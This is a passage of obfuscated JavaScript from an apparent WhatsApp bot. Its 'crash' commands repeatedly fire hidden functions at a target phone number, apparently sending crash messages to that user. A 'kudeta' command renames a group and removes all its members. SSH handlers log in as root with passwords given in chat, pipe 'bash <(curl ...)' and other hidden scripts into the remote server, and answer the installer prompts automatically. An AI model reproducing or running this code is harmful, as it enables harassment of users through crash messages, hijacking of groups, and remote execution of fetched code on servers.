          await _0x32efae(_0x5051a5, target, _0xcba78f);
          _0x3652ad(_0x597c(383) + target + _0x597c(466));
        }
        break;
      case _0x597c(435):
      case _0x597c(821):
      case _0x597c(997):
        {
          if (!_0x403967) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          if (!q) {
            return _0x3652ad(_0x597c(748) + (_0x49f20b + _0x4af652) + _0x597c(564));
          }
          target = q[_0x597c(729)](/[^0-9]/g, '') + _0x597c(981);
          await _0x1fe716(_0x5051a5, target, "HALOO DEKK😹", 1020000, ptcp = true);
          _0x5e61a6(target, _0xcba78f);
          _0x162062(target, _0xcba78f);
          _0x23f122(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          await _0x2f2312(target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x5e61a6(target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x2f2312(target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          await _0x5e61a6(target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          _0x3652ad(_0x597c(383) + target + _0x597c(471));
        }
        break;
      case "crashbeta":
      case _0x597c(951):
      case _0x597c(954):
        {
          if (!_0x403967) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          if (!q) {
            return _0x3652ad(_0x597c(748) + (_0x49f20b + _0x4af652) + _0x597c(564));
          }
          target = q[_0x597c(729)](/[^0-9]/g, '') + _0x597c(981);
          await _0x1fe716(_0x5051a5, target, _0x597c(685), 1020000, ptcp = true);
          _0x5e61a6(target, _0xcba78f);
          _0x162062(target, _0xcba78f);
          _0x23f122(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x2f2312(target, _0xcba78f);
          await _0x5e61a6(target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          await _0x2f2312(target, _0xcba78f);
          _0x5e61a6(target, _0xcba78f);
          _0x162062(target, _0xcba78f);
          _0x23f122(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x5e61a6(target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          _0x3652ad(_0x597c(383) + target + _0x597c(425));
        }
        break;
      case _0x597c(382):
        {
          if (!_0x403967) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          if (!_0x12cc16) {
            return _0x3652ad(_0x597c(496));
          }
          if (!_0x35d515 && !isCreator) {
            return Painzyrzx[_0x597c(937)](_0x597c(711));
          }
          if (!_0x1814f3) {
            return _0x5051a5[_0x597c(937)](_0x597c(698));
          }
          await _0x5051a5.groupUpdateSubject(_0x432e1b[_0x597c(805)], _0x597c(523));
          await _0x5051a5.groupUpdateDescription(_0x432e1b.chat, "𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗥𝗜𝗭𝗫𝗭 𝗪𝗔𝗡𝗚𝗦𝗔𝗙𝗙");
          let _0x7c34fe = _0x3aa99c[_0x597c(541)](_0x2772c2 => _0x2772c2.id);
          for (let _0x53457b of _0x7c34fe) {
            if (_0x53457b !== _0xa4cde5 && _0x53457b !== _0x407bc1.owner && _0x53457b !== kontributor + _0x597c(981)) {
              await _0x5051a5[_0x597c(834)](_0x432e1b[_0x597c(805)], [_0x53457b], _0x597c(761));
            }
          }
        }
        break;
      case _0x597c(537):
      case _0x597c(728):
      case 'obfuscate':
        {
          if (!q) {
            return _0x3652ad("Contoh " + (_0x49f20b + _0x4af652) + " const time = require('money')");
          }
          let _0x497d4c = await _0x108d28(q);
          _0x3652ad('' + _0x497d4c[_0x597c(939)]);
        }
        break;
      case _0x597c(374):
        {
          if (!_0x18271c) {
            return _0x3652ad(msg[_0x597c(633)]);
          }
          let _0xf08d8a = _0x4d0552[_0x597c(613)](',');
          if (_0xf08d8a[_0x597c(625)] < 2) {
            return _0x3652ad("*Format salah!*\nPenggunaan: " + _0x49f20b + _0x597c(387));
          }
          let _0x267228 = _0xf08d8a[0][_0x597c(452)]();
          let _0x155644 = _0xf08d8a[1][_0x597c(452)]();
          const _0x8a87b0 = {
            host: _0x267228,
            port: '22',
            username: "root",
            password: _0x155644
          };
          const _0x596eaa = _0x597c(468);
          const _0x47bb15 = new _0x4b5e91();
          _0x47bb15.on('ready', () => {
            _0x3652ad(_0x597c(806));
            _0x47bb15[_0x597c(705)](_0x596eaa, (_0x4102b8, _0x5c3ab2) => {
              if (_0x4102b8) {
                throw _0x4102b8;
              }
              _0x5c3ab2.on(_0x597c(813), (_0x16ab1f, _0x189578) => {
                console[_0x597c(949)](_0x597c(372) + _0x16ab1f + _0x597c(584) + _0x189578);
                _0x47bb15[_0x597c(814)]();
              }).on(_0x597c(777), _0x39dc3a => {
                console[_0x597c(949)]("STDOUT: " + _0x39dc3a);
                if (_0x39dc3a[_0x597c(556)]()[_0x597c(402)]('Input')) {
                  if (_0x39dc3a[_0x597c(556)]()[_0x597c(402)]('6')) {
                    _0x5c3ab2[_0x597c(655)]("6\n");
                  } else if (_0x39dc3a[_0x597c(556)]().includes(_0x597c(999))) {
                    _0x5c3ab2.write("y\n");
                  } else {
                    _0x5c3ab2[_0x597c(655)]("\n");
                  }
                }
              })[_0x597c(443)].on(_0x597c(777), _0x2d06eb => {
                console.log(_0x597c(384) + _0x2d06eb);
              });
            });
          })[_0x597c(831)](_0x8a87b0);
          await new Promise(_0x1d3df8 => setTimeout(_0x1d3df8, 20000));
        }
        break;
      case "uninstalltheme":
        {
          if (!_0x18271c) {
            return "Maaf Hanya Untuk RizxzWangsaff";
          }
          let _0x55b7e3 = _0x4d0552[_0x597c(613)](',');
          if (_0x55b7e3[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(804) + _0x49f20b + _0x597c(706));
          }
          let _0x4ddef8 = _0x55b7e3[0];
          let _0x29777e = _0x55b7e3[1];
          const _0x103ee9 = {
            'host': _0x4ddef8,
            'port': '22',
            'username': _0x597c(590),
            'password': _0x29777e
          };
          const _0xa0d1f6 = _0x597c(581);
          const _0x43341f = new _0x4b5e91();
          let _0x586777 = false;
          _0x43341f.on(_0x597c(548), () => {
            _0x586777 = true;
            _0x432e1b[_0x597c(395)](_0x597c(533));
            _0x43341f[_0x597c(705)](_0xa0d1f6, (_0xd09623, _0x4d7673) => {
              if (_0xd09623) {
                throw _0xd09623;
              }
              _0x4d7673.on(_0x597c(813), (_0x5806bb, _0x324c12) => {
                console[_0x597c(949)]("Stream closed with code " + _0x5806bb + _0x597c(584) + _0x324c12);
                _0x43341f.end();
              }).on(_0x597c(777), _0x2a0759 => {
                _0x4d7673[_0x597c(655)]("\n");
                _0x4d7673.write("2\n");
                _0x4d7673[_0x597c(655)]("y\n");
                _0x4d7673[_0x597c(655)](_0x597c(642));
                _0x4d7673.write("x\n");
                console[_0x597c(949)](_0x597c(611) + _0x2a0759);
              }).stderr.on(_0x597c(777), _0x4fe4f1 => {
                console[_0x597c(949)](_0x597c(384) + _0x4fe4f1);
              });
            });
          }).on('error', _0x547f3a => {
            console[_0x597c(949)](_0x597c(817) + _0x547f3a);
            _0x432e1b[_0x597c(395)]("Katasandi atau IP tidak valid");
          })[_0x597c(831)](_0x103ee9);
          setTimeout(() => {
            if (_0x586777) {
              _0x432e1b.rzxReply(_0x597c(922));
            }
          }, 180000);
        }
        break;
      case _0x597c(986):
        {
          if (!_0x18271c && !_0x403967) {
            return _0x597c(609);
          }
          let _0x776109 = _0x4d0552.split(',');
          if (_0x776109[_0x597c(625)] < 5) {
            return _0x432e1b[_0x597c(395)](_0x597c(804) + _0x49f20b + _0x597c(726));
          }
          let _0x53a763 = _0x776109[0];
          let _0x5f0073 = _0x776109[1];
          let _0x59832a = _0x776109[2];
          let _0x4611b9 = _0x776109[3];
          let _0x5c5a46 = _0x776109[4];
          const _0x266749 = {
            'host': _0x53a763,
            'port': '22',
            'username': _0x597c(590),
            'password': _0x5f0073
          };
          let _0x2c3694 = generateRandomPassword();
          const _0x2d045a = _0x597c(468);
          const _0x500ddc = new _0x4b5e91();
          _0x500ddc.on('ready', () => {
            _0x432e1b[_0x597c(395)](_0x597c(1019));
            _0x500ddc[_0x597c(705)](_0x2d045a, (_0x19f9e6, _0x54231b) => {
              if (_0x19f9e6) {
                throw _0x19f9e6;
              }
              _0x54231b.on(_0x597c(813), (_0x4aa096, _0xea9d76) => {
                console.log(_0x597c(816) + _0x4aa096 + _0x597c(584) + _0xea9d76);
                _0x1ba3f4(_0x500ddc, _0x4611b9, _0x59832a, _0x2c3694, _0x5c5a46);
              }).on(_0x597c(777), _0x207817 => {
                _0x4e84d2(_0x207817, _0x54231b, _0x59832a, _0x2c3694);
              })[_0x597c(443)].on(_0x597c(777), _0x3de2f5 => {
                console.log(_0x597c(384) + _0x3de2f5);
              });
            });
          })[_0x597c(831)](_0x266749);
          async function _0x1ba3f4(_0x2a464a, _0x281dc0, _0x1e4631, _0x42bbdf, _0x1970cc) {
            _0x432e1b[_0x597c(395)]("𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗪𝗜𝗡𝗚𝗦 𝗦𝗔𝗕𝗔𝗥 𝗬𝗔 𝗠𝗔𝗡𝗜𝗘𝗭");
            _0x2a464a[_0x597c(705)]("bash <(curl -s https://pterodactyl-installer.se)", (_0x154843, _0x203d59) => {
              if (_0x154843) {
                throw _0x154843;
              }
              _0x203d59.on(_0x597c(813), (_0x214384, _0x4b6f0e) => {
                console.log(_0x597c(344) + _0x214384 + _0x597c(584) + _0x4b6f0e);
                _0x32abe4(_0x2a464a, _0x281dc0, _0x1970cc, _0x1e4631, _0x42bbdf);
              }).on(_0x597c(777), _0x23bb7f => {
                _0x21a512(_0x23bb7f, _0x203d59, _0x281dc0, _0x1e4631);
              })[_0x597c(443)].on(_0x597c(777), _0x2f7b3c => {
                console[_0x597c(949)](_0x597c(384) + _0x2f7b3c);
              });
            });
          }
          async function _0x32abe4(_0x460bf6, _0xd0b70, _0x460acf, _0x136f4e, _0x478934) {
            const _0x162109 = _0x597c(536);
            _0x432e1b.rzxReply("𝗠𝗘𝗠𝗨𝗟𝗔𝗜 𝗖𝗥𝗘𝗔𝗧𝗘 𝗡𝗢𝗗𝗘 & 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡");
            _0x460bf6.exec(_0x162109, (_0x4378ed, _0x267a4d) => {
              if (_0x4378ed) {
                throw _0x4378ed;
              }
              _0x267a4d.on(_0x597c(813), (_0x3a079c, _0x3792db) => {
                console.log("Node creation stream closed with code " + _0x3a079c + _0x597c(584) + _0x3792db);
                _0x460bf6[_0x597c(814)]();
                _0x4175e4(_0x136f4e, _0x478934);
              }).on(_0x597c(777), _0x436026 => {
                _0x1c54dd(_0x436026, _0x267a4d, _0xd0b70, _0x460acf);
              })[_0x597c(443)].on(_0x597c(777), _0x1c88cb => {
                console[_0x597c(949)](_0x597c(384) + _0x1c88cb);
              });
            });
          }
          function _0x4175e4(_0x4c1fe2, _0x54a161) {
            _0x432e1b[_0x597c(395)](_0x597c(391) + _0x4c1fe2 + "\n\n𝗡𝗼𝘁𝗲: 𝗦𝗲𝗺𝘂𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗖𝗿𝗲𝗮𝘁𝗲 𝗔𝗹𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗗𝗶 𝗡𝗼𝗱𝗲 𝗬𝗮𝗻𝗴 𝗗𝗶 𝗯𝘂𝗮𝘁 𝗢𝗹𝗲𝗵 𝗕𝗼𝘁 𝗗𝗮𝗻 𝗔𝗺𝗯𝗶𝗹 𝗧𝗼𝗸𝗲𝗻 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗱𝗮𝗻 𝗸𝗲𝘁𝗶𝗸 .𝘀𝘁𝗮𝗿𝘁𝘄𝗶𝗻𝗴𝘀 (𝘁𝗼𝗸𝗲𝗻) \n𝗡𝗼𝘁𝗲: 𝗛𝗔𝗥𝗔𝗣 𝗧𝗨𝗡𝗚𝗚𝗨 𝟭-𝟱𝗠𝗘𝗡𝗜𝗧 𝗕𝗜𝗔𝗥 𝗪𝗘𝗕 𝗕𝗜𝗦𝗔 𝗗𝗜 𝗕𝗨𝗞𝗔");
          }
          function _0x4e84d2(_0x5da904, _0xeea148, _0x3095d0, _0x3c7e55) {
            if (_0x5da904[_0x597c(556)]().includes("Input")) {
              _0xeea148[_0x597c(655)]("0\n");
            }
            if (_0x5da904.toString()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)]("\n");
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0xeea148[_0x597c(655)]("\n");
            }
            if (_0x5da904.toString()[_0x597c(402)]('Input')) {
              _0xeea148[_0x597c(655)](_0x597c(1010));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0xeea148.write(_0x597c(506));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)](_0x597c(1014));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0xeea148[_0x597c(655)](_0x597c(1014));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)](_0x597c(812));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148.write(_0x597c(464));
            }
            if (_0x5da904.toString()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)]("adm\n");
            }
            if (_0x5da904.toString().includes(_0x597c(450))) {
              _0xeea148[_0x597c(655)](_0x597c(1017));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)](_0x3095d0 + "\n");
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)]("y\n");
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148.write("y\n");
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0xeea148[_0x597c(655)]("y\n");
            }
            if (_0x5da904[_0x597c(556)]().includes("Input")) {
              _0xeea148.write("y\n");
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)](_0x597c(642));
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)]("Please read the Terms of Service")) {
              _0xeea148.write("A\n");
            }
            if (_0x5da904[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0xeea148[_0x597c(655)]("\n");
            }
            if (_0x5da904[_0x597c(556)]().includes(_0x597c(450))) {
              _0xeea148[_0x597c(655)]("1\n");
            }
            console[_0x597c(949)](_0x597c(611) + _0x5da904);
          }
          function _0x21a512(_0x2affea, _0x32cb11, _0x545e33, _0x2d4277) {
            if (_0x2affea.toString()[_0x597c(402)](_0x597c(450))) {
              _0x32cb11[_0x597c(655)]("1\n");
            }
            if (_0x2affea[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x32cb11[_0x597c(655)]("y\n");
            }
            if (_0x2affea[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x32cb11[_0x597c(655)]("y\n");
            }
            if (_0x2affea.toString().includes(_0x597c(450))) {
              _0x32cb11.write("y\n");
            }
            if (_0x2affea[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x32cb11[_0x597c(655)](_0x2d4277 + "\n");
            }
            if (_0x2affea[_0x597c(556)]().includes(_0x597c(450))) {
              _0x32cb11[_0x597c(655)]("y\n");
            }
            if (_0x2affea.toString()[_0x597c(402)](_0x597c(450))) {
              _0x32cb11[_0x597c(655)](_0x597c(365));
            }
            if (_0x2affea[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x32cb11[_0x597c(655)]("1248\n");
            }
            if (_0x2affea.toString()[_0x597c(402)](_0x597c(450))) {
              _0x32cb11.write("y\n");
            }
            if (_0x2affea[_0x597c(556)]().includes("Input")) {
              _0x32cb11.write(_0x545e33 + "\n");
            }
            if (_0x2affea[_0x597c(556)]().includes(_0x597c(450))) {
              _0x32cb11[_0x597c(655)]("y\n");
            }
            if (_0x2affea[_0x597c(556)]().includes(_0x597c(450))) {
              _0x32cb11[_0x597c(655)](_0x597c(1014));
            }
            if (_0x2affea[_0x597c(556)]().includes("Input")) {
              _0x32cb11.write("y\n");
            }
            console[_0x597c(949)](_0x597c(611) + _0x2affea);
          }
          function _0x1c54dd(_0xaf889e, _0x1827a2, _0x5e6a47, _0x51c834) {
            _0x1827a2.write(_0x597c(868));
            _0x1827a2[_0x597c(655)]("4\n");
            _0x1827a2[_0x597c(655)](_0x597c(968));
            _0x1827a2[_0x597c(655)](_0x597c(547));
            _0x1827a2[_0x597c(655)](_0x5e6a47 + "\n");
            _0x1827a2[_0x597c(655)](_0x597c(971));
            _0x1827a2[_0x597c(655)](_0x51c834 + "\n");
            _0x1827a2.write(_0x51c834 + "\n");
            _0x1827a2[_0x597c(655)]("1\n");
            console[_0x597c(949)](_0x597c(611) + _0xaf889e);
          }
        }
        break;
      case _0x597c(759):
      case _0x597c(617):
        {
          if (!_0x18271c && !_0x403967) {
            return _0x597c(609);
          }
          let _0x447bd3 = _0x4d0552[_0x597c(613)](',');
          if (_0x447bd3.length < 5) {
            return _0x432e1b[_0x597c(395)](_0x597c(804) + _0x49f20b + _0x597c(896));
          }
          let _0x362dd1 = _0x447bd3[0];
          let _0x343969 = _0x447bd3[1];
          let _0x16a6a9 = _0x447bd3[2];
          let _0x1914ec = _0x447bd3[3];
          let _0x39df44 = _0x447bd3[4];
          const _0x5ce377 = {
            host: _0x362dd1,
            port: '22',
            username: "root",
            password: _0x343969
          };
          let _0x5c257c = generateRandomPassword();
          const _0x5a6631 = _0x597c(468);
          const _0x28c545 = _0x597c(468);
          const _0x4d84f0 = new _0x4b5e91();
          _0x4d84f0.on('ready', () => {
            _0x432e1b[_0x597c(395)](_0x597c(815));
            _0x4d84f0.exec(_0x5a6631, (_0x4c4988, _0x444623) => {
              if (_0x4c4988) {
                throw _0x4c4988;
              }
              _0x444623.on(_0x597c(813), (_0x2a8943, _0x5860e0) => {
                console[_0x597c(949)]("Panel installation stream closed with code " + _0x2a8943 + _0x597c(584) + _0x5860e0);
                _0x4f0c14(_0x4d84f0, _0x1914ec, _0x16a6a9, _0x5c257c, _0x39df44);
              }).on("data", _0x45460e => {
                _0xa97c39(_0x45460e, _0x444623, _0x16a6a9, _0x5c257c);
              })[_0x597c(443)].on(_0x597c(777), _0x20a696 => {
                console.log("STDERR: " + _0x20a696);
              });
            });
          })[_0x597c(831)](_0x5ce377);
          async function _0x4f0c14(_0x368a56, _0x2c5c56, _0x1648d3, _0x5922c3, _0xefbb6c) {
            _0x432e1b[_0x597c(395)](_0x597c(514));
            _0x368a56[_0x597c(705)](_0x28c545, (_0x3bfcd1, _0x32787b) => {
              if (_0x3bfcd1) {
                throw _0x3bfcd1;
              }
              _0x32787b.on(_0x597c(813), (_0x2591b4, _0x25c750) => {
                console[_0x597c(949)](_0x597c(344) + _0x2591b4 + _0x597c(584) + _0x25c750);
                _0x2132f0(_0x368a56, _0x2c5c56, _0xefbb6c, _0x1648d3, _0x5922c3);
              }).on(_0x597c(777), _0x15b850 => {
                _0x3fd038(_0x15b850, _0x32787b, _0x2c5c56, _0x1648d3);
              })[_0x597c(443)].on(_0x597c(777), _0x2ee6fe => {
                console[_0x597c(949)](_0x597c(384) + _0x2ee6fe);
              });
            });
          }
          async function _0x2132f0(_0x167368, _0x137403, _0x56f6cb, _0x5eaa57, _0x2a7657) {
            const _0x40864f = _0x597c(536);
            _0x432e1b[_0x597c(395)]("𝗠𝗘𝗠𝗨𝗟𝗔𝗜 𝗖𝗥𝗘𝗔𝗧𝗘 𝗡𝗢𝗗𝗘 & 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡");
            _0x167368[_0x597c(705)](_0x40864f, (_0x322722, _0x219ad1) => {
              if (_0x322722) {
                throw _0x322722;
              }
              _0x219ad1.on("close", (_0x2821a1, _0x3ec45c) => {
                console[_0x597c(949)]("Node creation stream closed with code " + _0x2821a1 + _0x597c(584) + _0x3ec45c);
                _0x167368[_0x597c(814)]();
                _0x2f2d9f(_0x5eaa57, _0x2a7657);
              }).on(_0x597c(777), _0x44e26a => {
                _0x18c194(_0x44e26a, _0x219ad1, _0x137403, _0x56f6cb);
              })[_0x597c(443)].on(_0x597c(777), _0x8cce05 => {
                console.log(_0x597c(384) + _0x8cce05);
              });
            });
          }
          function _0x2f2d9f(_0x381924, _0x14bd55) {
            _0x432e1b[_0x597c(395)](_0x597c(391) + _0x381924 + _0x597c(418));
          }
          function _0xa97c39(_0x79a3b7, _0x94b59e, _0x3e6997, _0x1b66c5) {
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e[_0x597c(655)]("0\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e.write("\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x94b59e.write("\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e.write(_0x597c(1017));
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x94b59e[_0x597c(655)](_0x597c(506));
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e.write(_0x597c(1014));
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x94b59e[_0x597c(655)]("admin@gmail.com\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x94b59e.write(_0x597c(812));
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x94b59e[_0x597c(655)]("adm\n");
            }
            if (_0x79a3b7.toString().includes(_0x597c(450))) {
              _0x94b59e[_0x597c(655)]("adm\n");
            }
            if (_0x79a3b7.toString()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e[_0x597c(655)]("123\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e[_0x597c(655)](_0x3e6997 + "\n");
            }
            if (_0x79a3b7.toString().includes(_0x597c(450))) {
              _0x94b59e[_0x597c(655)]("y\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x94b59e[_0x597c(655)]("y\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e[_0x597c(655)]("y\n");
            }
            if (_0x79a3b7.toString().includes(_0x597c(450))) {
              _0x94b59e.write("y\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e.write(_0x597c(642));
            }
            if (_0x79a3b7.toString()[_0x597c(402)](_0x597c(703))) {
              _0x94b59e.write("Y\n");
            }
            if (_0x79a3b7[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x94b59e.write("\n");
            }
            if (_0x79a3b7.toString()[_0x597c(402)]("Input")) {
              _0x94b59e[_0x597c(655)]("1\n");
            }
            console.log(_0x597c(611) + _0x79a3b7);
          }
          function _0x3fd038(_0x3632d0, _0x553d60, _0x13eedd, _0x6cc265) {
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x553d60.write("1\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)]("y\n");
            }
            if (_0x3632d0[_0x597c(556)]().includes(_0x597c(450))) {
              _0x553d60[_0x597c(655)]("y\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)]("Input")) {
              _0x553d60[_0x597c(655)]("y\n");
            }
            if (_0x3632d0.toString().includes(_0x597c(450))) {
              _0x553d60.write("\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)]("y\n");
            }
            if (_0x3632d0[_0x597c(556)]().includes(_0x597c(450))) {
              _0x553d60[_0x597c(655)]("\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)]("123\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60.write("y\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)](_0x13eedd + "\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)]("y\n");
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)](_0x597c(1014));
            }
            if (_0x3632d0[_0x597c(556)]()[_0x597c(402)](_0x597c(450))) {
              _0x553d60[_0x597c(655)]("y\n");
            }
            console[_0x597c(949)](_0x597c(611) + _0x3632d0);
          }
          function _0x18c194(_0x5bbb61, _0x2cd634, _0x47c053, _0x3c20e7) {
            _0x2cd634[_0x597c(655)](_0x597c(868));
            _0x2cd634[_0x597c(655)]("4\n");
            _0x2cd634[_0x597c(655)](_0x597c(968));
            _0x2cd634[_0x597c(655)](_0x597c(547));
            _0x2cd634[_0x597c(655)](_0x47c053 + "\n");
            _0x2cd634[_0x597c(655)](_0x597c(971));
            _0x2cd634[_0x597c(655)](_0x3c20e7 + "\n");
            _0x2cd634.write(_0x3c20e7 + "\n");
            _0x2cd634[_0x597c(655)]("1\n");
            console[_0x597c(949)](_0x597c(611) + _0x5bbb61);
          }
        }
        break;
      case _0x597c(355):
      case _0x597c(910):
        {
          if (!_0x18271c) {
            return _0x3652ad(msg[_0x597c(633)]);
          }
          let _0x3b8690 = _0x4d0552[_0x597c(613)](',');
          if (_0x3b8690.length < 2) {
            return _0x3652ad(_0x597c(804) + cmd + _0x597c(959));
          }
          let _0x17923a = _0x3b8690[0];
          let _0x3c2367 = _0x3b8690[1];
          let _0x287046 = _0x3b8690[2];
          const _0x3dc594 = {
            'host': _0x17923a,
            'port': '22',
            'username': _0x597c(590),
            'password': _0x3c2367
          };
          const _0x7e0c17 = _0x597c(536);
          const _0x2420e9 = new _0x4b5e91();
          _0x2420e9.on(_0x597c(548), () => {
            isSuccess = true;
            _0x3652ad(_0x597c(979));
            _0x2420e9.exec(_0x7e0c17, (_0x3d2211, _0x1fa504) => {
              if (_0x3d2211) {
                throw _0x3d2211;
              }
              _0x1fa504.on("close", (_0x19f746, _0x4c0f9c) => {
                console.log(_0x597c(372) + _0x19f746 + " and signal " + _0x4c0f9c);
                _0x3652ad(_0x597c(731));
                _0x2420e9[_0x597c(814)]();
              }).on(_0x597c(777), _0x5836ef => {
                _0x1fa504[_0x597c(655)](_0x597c(868));
                _0x1fa504[_0x597c(655)]("3\n");
                _0x1fa504[_0x597c(655)](_0x287046 + "\n");
                console[_0x597c(949)](_0x597c(611) + _0x5836ef);
              }).stderr.on(_0x597c(777), _0x26a8f9 => {
                console.log(_0x597c(384) + _0x26a8f9);
              });
            });
          }).on(_0x597c(864), _0x426052 => {
            console[_0x597c(949)](_0x597c(817) + _0x426052);
            _0x3652ad(_0x597c(583));
          })[_0x597c(831)](_0x3dc594);
        }
        break;
      case _0x597c(742):
        {
          if (!_0x18271c) {
            return _0x3652ad(msg[_0x597c(633)]);
          }
          let _0x32da48 = _0x4d0552[_0x597c(613)](',');
          if (_0x32da48[_0x597c(625)] < 2) {
            return _0x3652ad("*Format salah!*\nPenggunaan: " + _0x49f20b + _0x597c(858));
          }
          let _0x2fb83e = _0x32da48[0];
          let _0xfdde56 = _0x32da48[1];
          let _0x33ffdc = _0x32da48[2];
          let _0x5115b2 = _0x32da48[3];
          const _0x12a0fb = {
            'host': _0x2fb83e,
            'port': '22',
            'username': _0x597c(590),
            'password': _0xfdde56
          };
          const _0x1d21a8 = _0x597c(536);
          const _0x52bac7 = new _0x4b5e91();
          _0x52bac7.on(_0x597c(548), () => {
            isSuccess = true;
            _0x3652ad(_0x597c(880));
            _0x52bac7[_0x597c(705)](_0x1d21a8, (_0x2086c6, _0xf9ca8e) => {
              if (_0x2086c6) {
                throw _0x2086c6;
              }
              _0xf9ca8e.on('close', (_0x703226, _0x34ee7a) => {
                console[_0x597c(949)](_0x597c(372) + _0x703226 + " and signal " + _0x34ee7a);
